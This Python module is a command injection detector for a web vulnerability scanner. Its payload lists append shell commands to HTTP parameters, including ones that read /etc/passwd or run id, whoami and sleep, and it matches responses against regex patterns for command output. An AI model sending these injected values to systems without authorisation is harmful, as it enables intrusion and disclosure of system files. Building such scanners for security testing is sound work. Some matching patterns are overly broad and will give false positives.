"""
Command Injection detector for SPECTR vulnerability scanner
"""

import time
from typing import Dict, List, Any, Optional
from utils.http_client import HTTPClient
from core.payloads import PayloadDatabase
from core.analyzer import ResponseAnalyzer

class CommandInjectionDetector:
    """Command Injection vulnerability detector"""
    
    def __init__(self, http_client: HTTPClient, payloads: PayloadDatabase):
        self.http_client = http_client
        self.payloads = payloads
        self.analyzer = ResponseAnalyzer()
        
        # Command injection indicators
        self.command_patterns = [
            r'uid=\d+\([\w\-]+\)',  # Unix user info
            r'gid=\d+\([\w\-]+\)',  # Unix group info
            r'root:.*:0:0:',        # passwd file
            r'Microsoft Windows',    # Windows ver output
            r'Volume in drive',      # Windows dir output
            r'Directory of',         # Windows dir output
            r'total \d+',           # Unix ls -la output
            r'drwxr-xr-x',          # Unix file permissions
            r'bin',                 # Common Unix directory
            r'usr',                 # Common Unix directory
            r'var',                 # Common Unix directory
            r'etc',                 # Common Unix directory
            r'System32',            # Windows system directory
            r'Program Files',       # Windows program directory
            r'[a-zA-Z]:\\',         # Windows drive letter
            r'bash:',               # Bash command not found
            r'sh:',                 # Shell command not found
            r'command not found',   # Command not found error
            r'is not recognized',   # Windows command not found
            r'cannot access',       # Unix access error
            r'No such file',        # Unix file not found
        ]
    
    def scan(self, url: str, method: str, params: Dict[str, Any], 
             headers: Optional[Dict[str, str]] = None, verbose: bool = False) -> List[Dict[str, Any]]:
        """Scan for command injection vulnerabilities"""
        
        results = []
        
        if not params:
            if verbose:
                print("   ℹ️  No parameters to test for command injection")
            return results
        
        # Get baseline response for comparison
        baseline_response = self.http_client.get_baseline_response(
            url=url, method=method, params=params, headers=headers, verbose=verbose
        )
        
        if not baseline_response:
            if verbose:
                print("   ❌ Could not get baseline response")
            return results
        
        # Test each parameter
        for param_name, param_value in params.items():
            if verbose:
                print(f"   🔍 Testing parameter '{param_name}' for command injection")
            
            # Test command injection
            cmd_results = self._test_command_injection(
                url, method, params, param_name, baseline_response, headers, verbose
            )
            results.extend(cmd_results)
            
            # Test time-based command injection
            time_results = self._test_time_based_injection(
                url, method, params, param_name, headers, verbose
            )
            results.extend(time_results)
        
        if verbose and results:
            print(f"   ✅ Found {len(results)} potential command injection vulnerabilities")
        
        return results
    
    def _test_command_injection(self, url: str, method: str, params: Dict[str, Any], 
                               param_name: str, baseline_response: Dict[str, Any], 
                               headers: Optional[Dict[str, str]] = None, 
                               verbose: bool = False) -> List[Dict[str, Any]]:
        """Test for command injection vulnerabilities"""
        
        results = []
        original_value = params.get(param_name, '')
        
        # Command injection payloads
        cmd_payloads = [
            # Unix/Linux commands
            f"{original_value}; id",
            f"{original_value}; whoami",
            f"{original_value}; pwd",
            f"{original_value}; ls -la",
            f"{original_value}; ps aux",
            f"{original_value}; uname -a",
            f"{original_value}; cat /etc/passwd",
            f"{original_value}; cat /etc/hosts",
            f"{original_value}; which python",
            f"{original_value}; which curl",
            
            # Windows commands
            f"{original_value}; dir",
            f"{original_value}; ver",
            f"{original_value}; whoami",
            f"{original_value}; ipconfig",
            f"{original_value}; systeminfo",
            f"{original_value}; tasklist",
            f"{original_value}; type C:\\Windows\\System32\\drivers\\etc\\hosts",
            
            # Command separators
            f"{original_value} | id",
            f"{original_value} | whoami",
            f"{original_value} | dir",
            f"{original_value} & id",
            f"{original_value} & whoami",
            f"{original_value} & dir",
            f"{original_value} && id",
            f"{original_value} && whoami",
            f"{original_value} && dir",
            f"{original_value} || id",
            f"{original_value} || whoami",
            f"{original_value} || dir",
            
            # Command substitution
            f"{original_value}`id`",
            f"{original_value}`whoami`",
            f"{original_value}$(id)",
            f"{original_value}$(whoami)",
            f"{original_value}$(pwd)",
            
            # Newline injection
            f"{original_value}\nid",
            f"{original_value}\nwhoami",
            f"{original_value}\ndir",
            f"{original_value}\r\nid",
            f"{original_value}\r\nwhoami",
            f"{original_value}\r\ndir",
            
            # URL encoded
            f"{original_value}%3Bid",
            f"{original_value}%3Bwhoami",
            f"{original_value}%26id",
            f"{original_value}%26whoami",
            f"{original_value}%7Cid",
            f"{original_value}%7Cwhoami",
            
            # Special cases
            "; id #",
            "; whoami #",
            "; dir #",
            "| id",
            "| whoami",
            "| dir",
            "& id",
            "& whoami",
            "& dir",
            "`id`",
            "`whoami`",
            "$(id)",
            "$(whoami)",
            "$(pwd)",
        ]
        
        for payload in cmd_payloads:
            response = self.http_client.test_payload(
                url=url, method=method, params=params, payload=payload,
                target_param=param_name, headers=headers, verbose=verbose
            )
            
            if response:
                # Check for command injection indicators
                content = response.get('content', '').lower()
                
                # Look for command output patterns
                for pattern in self.command_patterns:
                    import re
                    if re.search(pattern, content, re.IGNORECASE):
                        results.append({
                            'type': 'command_injection',
                            'parameter': param_name,
                            'payload': payload,
                            'method': 'pattern_based',
                            'evidence': f"Command output pattern detected: {pattern}",
                            'response_code': response.get('status_code', 0),
                            'response_time': response.get('response_time', 0)
                        })
                        
                        if verbose:
                            print(f"   🔴 Command injection found: {pattern}")
                        break
        
        return results
    
    def _test_time_based_injection(self, url: str, method: str, params: Dict[str, Any], 
                                  param_name: str, headers: Optional[Dict[str, str]] = None, 
                                  verbose: bool = False) -> List[Dict[str, Any]]:
        """Test for time-based command injection"""
        
        results = []
        original_value = params.get(param_name, '')
        
        # Time-based payloads
        time_payloads = [
            # Unix/Linux
            f"{original_value}; sleep 5",
            f"{original_value} | sleep 5",
            f"{original_value} & sleep 5",
            f"{original_value} && sleep 5",
            f"{original_value}; ping -c 5 127.0.0.1",
            f"{original_value} | ping -c 5 127.0.0.1",
            f"{original_value}`sleep 5`",
            f"{original_value}$(sleep 5)",
            
            # Windows
            f"{original_value}; timeout 5",
            f"{original_value} | timeout 5",
            f"{original_value} & timeout 5",
            f"{original_value} && timeout 5",
            f"{original_value}; ping -n 5 127.0.0.1",
            f"{original_value} | ping -n 5 127.0.0.1",
            
            # Newline injection
            f"{original_value}\nsleep 5",
            f"{original_value}\r\nsleep 5",
            f"{original_value}\ntimeout 5",
            f"{original_value}\r\ntimeout 5",
            
            # URL encoded
            f"{original_value}%3Bsleep%205",
            f"{original_value}%26sleep%205",
            f"{original_value}%7Csleep%205",
            
            # Special cases
            "; sleep 5 #",
            "| sleep 5",
            "& sleep 5",
            "`sleep 5`",
            "$(sleep 5)",
            "; timeout 5 #",
            "| timeout 5",
            "& timeout 5",
        ]
        
        for payload in time_payloads:
            start_time = time.time()
            response = self.http_client.test_payload(
                url=url, method=method, params=params, payload=payload,
                target_param=param_name, headers=headers, verbose=verbose
            )
            
            if response:
                response_time = response.get('response_time', 0)
                
                # Check for time delay (expecting 5+ seconds)
                if response_time >= 4.5:  # Allow some margin
                    results.append({
                        'type': 'command_injection',
                        'parameter': param_name,
                        'payload': payload,
                        'method': 'time_based',
                        'evidence': f"Time delay detected: {response_time:.2f}s",
                        'response_code': response.get('status_code', 0),
                        'response_time': response_time
                    })
                    
                    if verbose:
                        print(f"   🔴 Time-based command injection found: {response_time:.2f}s delay")
        
        return results
    
    def _test_blind_injection(self, url: str, method: str, params: Dict[str, Any], 
                             param_name: str, baseline_response: Dict[str, Any], 
                             headers: Optional[Dict[str, str]] = None, 
                             verbose: bool = False) -> List[Dict[str, Any]]:
        """Test for blind command injection"""
        
        results = []
        original_value = params.get(param_name, '')
        
        # Blind injection payloads (true/false conditions)
        blind_payloads = [
            # Unix/Linux - true conditions
            (f"{original_value}; [ -f /etc/passwd ] && echo 'true'", "true"),
            (f"{original_value}; [ -d /tmp ] && echo 'success'", "success"),
            (f"{original_value}; test -f /etc/passwd && echo 'exists'", "exists"),
            (f"{original_value}; which ls > /dev/null && echo 'found'", "found"),
            
            # Windows - true conditions
            (f"{original_value}; if exist C:\\Windows echo 'true'", "true"),
            (f"{original_value}; if exist C:\\Windows\\System32 echo 'success'", "success"),
            
            # Command substitution
            (f"{original_value}`echo 'injected'`", "injected"),
            (f"{original_value}$(echo 'injected')", "injected"),
        ]
        
        for payload, expected_output in blind_payloads:
            response = self.http_client.test_payload(
                url=url, method=method, params=params, payload=payload,
                target_param=param_name, headers=headers, verbose=verbose
            )
            
            if response:
                content = response.get('content', '')
                
                # Check if expected output appears in response
                if expected_output in content:
                    results.append({
                        'type': 'command_injection',
                        'parameter': param_name,
                        'payload': payload,
                        'method': 'blind_injection',
                        'evidence': f"Expected output '{expected_output}' found in response",
                        'response_code': response.get('status_code', 0),
                        'response_time': response.get('response_time', 0)
                    })
                    
                    if verbose:
                        print(f"   🔴 Blind command injection found: '{expected_output}' in response")
        
        return results